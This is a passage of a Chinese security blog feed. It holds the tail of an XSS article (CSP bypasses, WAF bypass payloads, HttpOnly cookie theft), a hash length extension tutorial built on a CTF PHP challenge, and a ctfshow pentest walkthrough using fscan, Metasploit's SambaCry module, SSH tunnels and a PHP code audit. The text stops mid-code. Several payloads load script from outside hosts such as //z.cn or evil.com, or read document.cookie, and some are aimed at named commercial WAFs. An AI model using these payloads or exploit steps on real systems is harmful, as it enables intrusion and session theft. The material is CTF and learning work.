&#39;unsafe-eval&#39;</code></p></li><li><p><code>nonce-&lt;base64-value&gt;&#39;</code></p><p>使用随机的nonce，允许加载标签上nonce属性匹配的标签</p><p>e.g. <code>script-src &#39;nonce-bm9uY2U=&#39;</code></p></li><li><p><code>&lt;hash-algo&gt;-&lt;base64-value&gt;&#39;</code></p><p>允许hash值匹配的代码块被执行</p><p>e.g. <code>script-src &#39;sha256-&lt;base64-value&gt;&#39;</code></p></li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>就是利用上面一些有风险的csp设置来绕过，比如unsafe-inline、unsafe-eval等等。相当于利用白名单绕过。</p><p><strong>预加载</strong></p><p>大概就是利用浏览器空闲的时候去加载指定的内容，然后缓存起来。</p><p>HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有unsafe-inline，则用预加载的方式可以向外界发出请求，例如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;!-- 预加载某个页面 --&gt;<br>&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- firefox --&gt;<br>&lt;link rel=&#x27;prerender&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- chrome --&gt;<br>&lt;!-- 预加载某个图片 --&gt;<br>&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx/x.jpg&#x27;&gt;<br>&lt;!-- DNS 预解析 --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxxx&quot;&gt;<br>&lt;!-- 特定文件类型预加载 --&gt;<br>&lt;link rel=&#x27;preload&#x27; href=&#x27;//xxxxx/xx.js&#x27;&gt;&lt;!-- chrome --&gt;<br></code></pre></td></tr></table></figure><p>但是下列资源类型是阻止预加载的：</p><ul><li>URL中包含下载资源</li><li>页面中包含音频、视频</li><li>POST、PUT和DELET操作的ajax请求</li><li>HTTP认证</li><li>HTTPS页面</li><li>含恶意软件的页面</li><li>弹窗页面</li><li>占用资源很多的页面</li><li>打开了chrome developer tools开发工具</li></ul><p><strong>MIME Sniff</strong></p><p>比如csp可以读图片但是不能读脚本，就可以将代码嵌在图片当中</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;http://xxx.com/xx.jpg&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>base-uri</strong></p><p>当script-src为nonce或无限制，且base-uri无限制时，可通过 <code>base</code> 标签修改根URL来bypass，如下加载了<code>http://evil.com/main.js</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;base href=&quot;http://evil.com/&quot;&gt;<br>&lt;script nonce=&quot;correct value&quot; src=&quot;/main.js&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>其他更多的参考这篇文章：<a href="https://websec.readthedocs.io/zh/latest/vuln/xss/csp.html">https://websec.readthedocs.io/zh/latest/vuln/xss/csp.html</a></p><h2 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h2><p>参考文章：<a href="https://www.cnblogs.com/rab3it/p/14526596.html">https://www.cnblogs.com/rab3it/p/14526596.html</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(1)&lt;/script&gt;<br>//下面是变形<br>&lt;img src=1 onerror=alert(1)&gt;<br><br>&lt;image/src=| onerror = javascript:alert(document.cookie)&gt;<br></code></pre></td></tr></table></figure><blockquote><p>src=的右边只要是数字、字母之类的，就会被拦截，<code>src=</code>右边是可以<code>接特殊字符串</code>的，所以语句变成如下格式<code>&lt;image/src=|&gt;</code>（注：这个是特殊字符竖杠，不是字母或者数字），这样就绕过了防护。</p></blockquote><p><strong>安全狗</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.safedog.cn/index/privateSolutionIndex.html?tab=2&lt;video/src/onerror=top[`al`%2B`ert`](1);&gt;<br>http://www.safedog.cn/index/privateSolutionIndex.html?tab=2&lt;video/src/onerror=appendChild(createElement(&quot;script&quot;)).src=&quot;//z.cn&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>D盾</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.d99net.net/News.asp?id=126&lt;video/src/onloadstart=top[`al`%2B`ert`](1);&gt;<br>http://www.d99net.net/News.asp?id=126&lt;video/src/onloadstart=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);&gt;<br></code></pre></td></tr></table></figure><p><strong>云锁+奇安信waf</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1&lt;video/src/onloadstart=top[`al`%2B`ert`](1);&gt;<br>http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1&lt;video/src/onloadstart=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);&gt;<br></code></pre></td></tr></table></figure><h2 id="绕http-only"><a href="#绕http-only" class="headerlink" title="绕http-only"></a>绕http-only</h2><p>当一个 cookie 标记为 <code>HttpOnly</code> 时，意味着这个 cookie 只能通过 HTTP 或 HTTPS 协议访问，不能通过 JavaScript 代码访问。也就是不能直接使用<code>document.cookie</code>这样的方式来直接带出cookie</p><p>可以利用phpinfo的<strong>HTTP_COOKIE</strong>字段带出cookie，可以写一个xhr请求访问phpinfo页面然后匹配该字段然后带出cookie。</p><h1 id="富文本XSS"><a href="#富文本XSS" class="headerlink" title="富文本XSS"></a>富文本XSS</h1><p>富文本编辑器是一种允许用户以所见即所得的方式创建和编辑格式化文本的工具。与仅支持纯文本编辑的编辑器不同，富文本编辑器支持一系列文本格式化选项，包括但不限于：</p><ul><li>字体样式（如加粗、斜体、下划线）</li><li>字体大小和颜色</li><li>段落对齐</li><li>列表（有序或无序列表）</li><li>超链接</li><li>图片和媒体嵌入</li><li>表格创建</li><li>头部和脚部注解</li></ul><p>其允许用户输入HTML、JavaScript以及CSS等丰富的内容格式来进行渲染，所以可能会造成xss。</p><p><strong>防御方式</strong></p><p>一般不采用转义的方式进行防御，因为会导致其富文本无法使用，比如有富文本功能的留言框之类的。</p><p>可以采用下面方式来防御和修复：</p><ol><li><strong>输入验证</strong>：对用户输入进行严格的验证，确保不允许不安全的标签和属性。</li><li><strong>输出编码</strong>：在将用户输入的数据渲染到页面上时，对所有用户生成的内容进行HTML编码。</li><li><strong>白名单过滤</strong>：定义一个安全标签和属性的白名单，只允许这些安全的元素被使用。</li><li><strong>内容安全策略（CSP）</strong>：使用CSP来限制可以执行的脚本的来源，减少XSS攻击的风险。</li><li><strong>定期更新</strong>：保持富文本编辑器及其依赖的库是最新的，以利用最新的安全修复。</li><li><strong>安全审计</strong>：定期对富文本编辑器的使用进行安全审计，以发现和修复潜在的安全漏洞。</li></ol><h1 id="XSS相关靶场"><a href="#XSS相关靶场" class="headerlink" title="XSS相关靶场"></a>XSS相关靶场</h1><ol><li><a href="https://alf.nu/alert1?world=alert&level=alert0">https://alf.nu/alert1?world=alert&amp;level=alert0</a></li><li><a href="https://prompt.ml/0">https://prompt.ml/0</a></li><li><a href="https://xss.tesla-space.com/">https://xss.tesla-space.com/</a></li><li>谷歌的xss游戏：<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></li></ol></script></strong></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希长度拓展攻击</title>
      <link href="/2024/04/25/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2024/04/25/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>在某新生赛看到的，来学习一下，参考文章：<a href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a></p><h1><span id="md5算法原理">MD5算法原理</span></h1><p>先具体看一下md5算法的原理是怎么样的然后来看一看具体的题目</p><p>这里放一张流程图：</p><p><img src="http://cdn.clown2024.cn/202407151450139.png" alt="img"></p><blockquote><p>整体的算法流程就是，将数据分块，每512位为一块，有一个初始序列，与第一个数据块进行运算，然后产生一个新的序列，继续与下一个数据块进行计算，以此类推。</p></blockquote><p>一个512位的数据块就是64个字符的大小，对MD5来说最后一个数据块的处理分为两种情况：</p><ul><li>明文数据的二进制数据长度&lt;&#x3D;448，填充padding(无意义占位)数据使其长度为448，再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</li><li>448&lt;明文数据的二进制数据长度&lt;&#x3D;512，填充padding数据至下一块的448位，而后再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</li></ul><p>这里借文章大佬的两张图：</p><p>这是第一种情况的</p><p><img src="http://cdn.clown2024.cn/202407151450140.png" alt="img"></p><p>这是第二种情况的</p><p><img src="http://cdn.clown2024.cn/202407151450141.png" alt="img"></p><blockquote><p>上图可以知道，padding的数据的特点是首位为1，后面都是0</p></blockquote><p>要注意一点长度信息位是从低位向高位的，比如上面的<code>f0 03 00 00 00 00 00 00</code>，即代表0x03f0，对应的十进制为1008，即为64+62&#x3D;126个字符的二进制位数。</p><p>下面说一下向量串的转换</p><p>MD5有一个初始的固定向量串用来参与运算，其流程图如下：</p><p><img src="http://cdn.clown2024.cn/202407151450142.png" alt="向量运算"></p><p>然后得到的最后一个向量串再经过高低位呼唤就是我们最后的MD5的32个16进制字符，比如最后的向量串是这样的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">A=0xab45bc01<br>B=0x6a64bb53 <br>C=0x23ba8afe<br>D=0x46847a62<br></code></pre></td></tr></table></figure><p>然后两两一组组合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ab 45 bc 01<br>6a 64 bb 53<br>23 ba 8a fe<br>46 84 7a 62<br></code></pre></td></tr></table></figure><p>然后高低位互换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">01 bc 45 ab<br>53 bb 64 6a<br>fe 8a ba 23<br>62 7a 84 46<br></code></pre></td></tr></table></figure><p>最终拼接就得到最终的MD5值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">01bc45ab53bb646afe8aba23627a8446<br></code></pre></td></tr></table></figure><p>如同MD5算法那般分组后与向量运算的流程被统称为<strong>Merkle–Damgård</strong>结构。</p><p>而同样使用此结构的HASH算法还有：SHA1、SHA2等</p><h1><span id="哈希拓展攻击">哈希拓展攻击</span></h1><p>那么知道上面的原理之后我们能干什么呢</p><p>这里来用一道题来分析一下通过这个算法流程我们能做什么事</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$secret</span>=<span class="hljs-string">&quot;1234567890abcde&quot;</span>; <span class="hljs-comment">// This secret is 15 characters long for security!</span><br><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;getmein&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span> . <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$username</span> . <span class="hljs-variable">$password</span>)))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulations! You are a registered user.\n&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The flag is &quot;</span>. <span class="hljs-variable">$flag</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>&#125;<br><span class="hljs-comment">// md5(1234567890abcdeadmin)=b7271fdc3f7b4ee4f9fd6f6eb059c1f3</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一般哈希拓展的题目都会给我们一个已知的哈希和已知的密文长度，密文我们一般都是不知道，这里是本地所以就设置了一个方便测试，我们假装不知道。</p><p>这题就是我们知道了一个密文的哈希以及他的长度，这里<code>1234567890abcdeadmina</code>的哈希是<code>b7271fdc3f7b4ee4f9fd6f6eb059c1f3</code>，长度是20；现在我们需要传一个getmein参数和一个password参数，其中username变量和password参数会被拼接到$secret变量上面去然后进行md5，我们传的<code>getmein</code>就是一个哈希需要与拼接后的字符串的md5相等。</p><p>这里我们就可以利用哈希的算法流程，通过我们传递的password参数来做一些手脚了。</p><p>回想一下这个长度20的字符串是怎么进行加密的呢；这个字符串符合我们的第一种情况，长度小于等于448，那么就会padding数据到448位然后补上64位的数据长度信息，那么这些padding的信息和数据长度的信息我们都是知道，我们就可以通过传递的password参数手动padding然后出来的哈希值也是一样的。</p><p>那现在我们要传password参数，随便传一些东西他的哈希我们肯定是不知道的，但是上面说了我们可以padding数据到与他给的哈希相等，我们把这个数据块当成倒数第二个，这个哈希值我们是已知的，我们padding完之后再加一些我们指定的字符串，这些字符串就会放入下一个数据块，也就是最后一个。</p><p>现在要计算最后一个数据块的哈希的条件，<code>数据长度</code>、<code>上一个数据块的哈希</code>，这两样东西都已经齐全了，那最终的哈希我们就可以预测了，这也就是所谓的哈希拓展，也就是通过已知的上一个数据块哈希，利用我们传递的参数去padding一些数据来预测下一个数据块的哈希。</p><p><strong>这里提供两个工具</strong></p><ol><li>hexpand：安装教程跟着这篇来：<a href="https://www.cnblogs.com/pcat/p/7668989.html%E3%80%82">https://www.cnblogs.com/pcat/p/7668989.html。</a></li><li>类hexpump：<a href="https://github.com/shellfeel/hash-ext-attack?tab=readme-ov-file%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%8E%9F%E6%9D%A5%E7%9A%84hexpump%E9%A1%B9%E7%9B%AE%E4%B8%8D%E8%A7%81%E4%BA%86%EF%BC%8C%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E5%8A%9F%E8%83%BD%E8%B7%9Fhexpump%E4%B8%80%E6%A0%B7%E7%9A%84%E3%80%82%E4%BD%86%E6%98%AFhexpump%E9%9C%80%E8%A6%81%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%EF%BC%8C%E7%8E%B0%E5%9C%A8%E4%B8%80%E8%88%AC%E4%B8%8D%E6%8F%90%E4%BE%9B%EF%BC%8C%E5%8E%9F%E7%90%86%E4%B8%8A%E4%B9%9F%E4%B8%8D%E9%9C%80%E8%A6%81%EF%BC%8C%E6%89%80%E4%BB%A5%E7%94%A8%E7%9A%84%E4%BC%9A%E6%AF%94%E8%BE%83%E5%B0%91">https://github.com/shellfeel/hash-ext-attack?tab=readme-ov-file，因为原来的hexpump项目不见了，找到一个功能跟hexpump一样的。但是hexpump需要原始数据，现在一般不提供，原理上也不需要，所以用的会比较少</a></li></ol><p>这里用hexpand工具</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">/hexpand -t md5 -s b7271fdc3f7b4ee4f9fd6f6eb059c1f3 -l 20 -m test # -s是我们的已知哈希；-l是密文长度；-m是我们要添加的数据，根据题目来，这里没有限制我们随意即可<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151450143.png" alt="image-20240426200811887"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">fb66c4470d1c810edc1d77678a4299c0 //我们最终的哈希<br>800000000000000000000000000000000000000000000000000000000000000000000000a00000000000000074657374  //我们要添加的数据<br></code></pre></td></tr></table></figure><p>因为这里我们是url传递还需要写个脚本加上百分号</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">value=<span class="hljs-string">&quot;800000000000000000000000000000000000000000000000000000000000000000000000a00000000000000074657374&quot;</span><br>value2=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(value),<span class="hljs-number">2</span>):<br>    value2+=<span class="hljs-string">&quot;%&quot;</span>+value[i]+value[i+<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(value2)<br><br><span class="hljs-comment"># 结果：%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%a0%00%00%00%00%00%00%00%74%65%73%74</span><br></code></pre></td></tr></table></figure><p>然后post传递看看结果</p><p><img src="http://cdn.clown2024.cn/202407151450144.png" alt="image-20240426201054526"></p><p>可以看到我们成功拿到了flag</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_web859</title>
      <link href="/2024/04/24/ctfshow-web859/"/>
      <url>/2024/04/24/ctfshow-web859/</url>
      
        <content type="html"><![CDATA[<p>这是一道ctfshow上面的渗透题，来自2023年2月的RealWorldCTF渗透赛环境，提供了跳板机，这里来打一打学习一下。</p><h1><span id="信息搜集">信息搜集</span></h1><p><img src="http://cdn.clown2024.cn/202407151506132.png" alt="image-20240424211510425"></p><p>先用Termius连接跳板机，然后使用如下命令获得一个交互式shell方便一点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sudo -s #切换到root用户<br>python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; #获得交互式shell<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440702.png" alt="image-20240424211734391"></p><p>然后上传fscan上去扫一下，这里先用Termius的sftp发现传不了失败了</p><p>但是可以用scp来传</p><blockquote><p><strong>scp命令</strong> 用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">scp -P 28260 fscan_amd64 ctfshow@pwn.challenge.ctf.show:/tmp #将fscan上传到/tmp目录下面<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440703.png" alt="image-20240424212509835"></p><p>然后进行扫描看看</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./fscan_amd64 -h 172.2.90.0/24 &gt; fscan.txt #保存到文件下面方便查看<br></code></pre></td></tr></table></figure><p>这是扫描结果</p><p><img src="http://cdn.clown2024.cn/202407151506133.png" alt="image-20240424214452168"></p><p>然后再单独扫一下172.2.90.5 这个地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./fscan_amd64 -h 172.2.90.5 <br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440705.png" alt="image-20240424215304938"></p><p> 看上去是有个cve的样子，然后结合上面172.2.90.6还开放了445和139这两个共享端口，172.2.90.6用的系统是Windows6.1，172.2.90.5还开放了一个9000端口，信息搜集大概就这么多。</p><h1><span id="开始渗透">开始渗透</span></h1><h2><span id="尝试对139和445端口渗透">尝试对139和445端口渗透</span></h2><p>先针对上面的139和445这两个常见的危险端口进行渗透，msf有相关的利用模块，该跳板机已经给我们配置了msf</p><p>445端口存在smb服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">search ms17_010  #msf搜索一下相关模块<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506134.png" alt="image-20240424220514692"></p><p>先使用扫描模块对靶机进行扫描</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use auxiliary/scanner/smb/smb_ms17_010<br>set rhost 172.2.90.6<br>run<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506135.png" alt="image-20240424220815110"></p><p>emmm似乎没有漏洞</p><p>那换一个139端口看看，139端口存在samba服务</p><p>那再用exp打一下这个端口看看</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">search samba<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506136.png" alt="image-20240424221712993"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use exploit/linux/samba/is_known_pipename<br>set rhost 172.2.90.6<br>exploit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506137.png" alt="image-20240424222007305"></p><p>然后在root下面看到flag</p><p><img src="http://cdn.clown2024.cn/202407151506138.png" alt="image-20240424222049190"></p><h2><span id="看看web页面">看看web页面</span></h2><p>很奇怪上面一下子就打出来flag有点容易（</p><p>那就来看一下web页面吧，顺便学学ssh隧道，一开始想用frp代理但是不出网</p><p>做一个ssh隧道转发</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ssh -CfNg -L (本地端口):(目标主机ip):(目标主机端口) (跳板机用户名)@(跳板机ip) -p (跳板机端口)</span><br>ssh -CfNg -L 80:172.2.90.5:80 ctfshow@pwn.challenge.ctf.show -p 28260<br></code></pre></td></tr></table></figure><p>额怪了一直说识别不了主机</p><p><img src="http://cdn.clown2024.cn/202407151506139.png" alt="image-20240424231544798"></p><p>最后用termius的port forwarding做了一个ssh隧道映射到本地的8081端口</p><p><img src="http://cdn.clown2024.cn/202407151440712.png" alt="image-20240427011859538"></p><p>然后访问本地的8081端口即可</p><p><img src="http://cdn.clown2024.cn/202407151440713.png" alt="image-20240427011939005"></p><p>然后点击下图的位置会跳到该项目的gitee仓库，里面有源码，可以下载下来代码审计</p><p><img src="http://cdn.clown2024.cn/202407151506140.png" alt="image-20240427012117285"></p><h2><span id="代码审计">代码审计</span></h2><p><img src="http://cdn.clown2024.cn/202407151506141.png" alt="image-20240427013405249"></p><p>看了前端的页面我们可以知道他会向api&#x2F;index.php发送请求，我们去看一下api目录</p><p><img src="http://cdn.clown2024.cn/202407151440716.png" alt="image-20240427013625445"></p><p>发现有三个文件</p><p><strong>config.php</strong></p><p><img src="http://cdn.clown2024.cn/202407151506142.png" alt="image-20240427013705919"></p><p>数据库名、用户名、密码我们都知道了，可以考虑一下注入或者能不能登陆后台</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] ?? <span class="hljs-string">&quot;login&quot;</span>;<br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$action</span>) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;login&#x27;</span>:<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doLogin</span>();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;reset&#x27;</span>:<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doReset</span>();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;view&#x27;</span>:<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doView</span>();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doDefault</span>();<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506143.png" alt="image-20240427014000436"></p><p>可以得知该系统通过给a传参，根据传参的不同去实现不同的功能，一个功能由一个函数执行</p><p><strong>doLogin()功能</strong></p><p>首先来审一下登陆区的功能</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doLogin</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doFilter</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doFilter</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpwd</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>())&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>&#125;<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;set name <span class="hljs-subst">$charName</span>&quot;</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select password from user where username = &#x27;<span class="hljs-subst">$username</span>&#x27; and password = &#x27;<span class="hljs-subst">$password</span>&#x27; limit 0,1;&quot;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>]===<span class="hljs-variable">$password</span>)&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;LOGIN&#x27;</span>]=<span class="hljs-literal">true</span>;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;LOGIN&#x27;</span>]=<span class="hljs-literal">false</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;登陆失败&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;LOGIN&#x27;</span>]?<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dispatcher</span>(<span class="hljs-string">&quot;../ckfinder/ckfinder.html&quot;</span>):<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dispatcher</span>(<span class="hljs-string">&quot;../index.php&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doFilter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;%27&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;%22&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;%5c&quot;</span>, <span class="hljs-variable">$str</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里没有预编译很明显是可以sql注入的，这里对username和password进行了一些过滤，将’、”、\都换成对应的url编码的字符串。然后判断登陆是否成功的逻辑就是，与查询回来对应用户名的password是否相等，若相等则sesson的login参数为true，然后跳转到登陆后的页面。</p><p>但是看上去有点难注入，登陆不了admin，看了一下doReset功能没有doFilter过滤，有点机会</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doReset</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><span class="hljs-variable">$email</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;email&#x27;</span>,FILTER_VALIDATE_EMAIL);<br><span class="hljs-variable">$username</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doFilter</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$conn</span> = <span 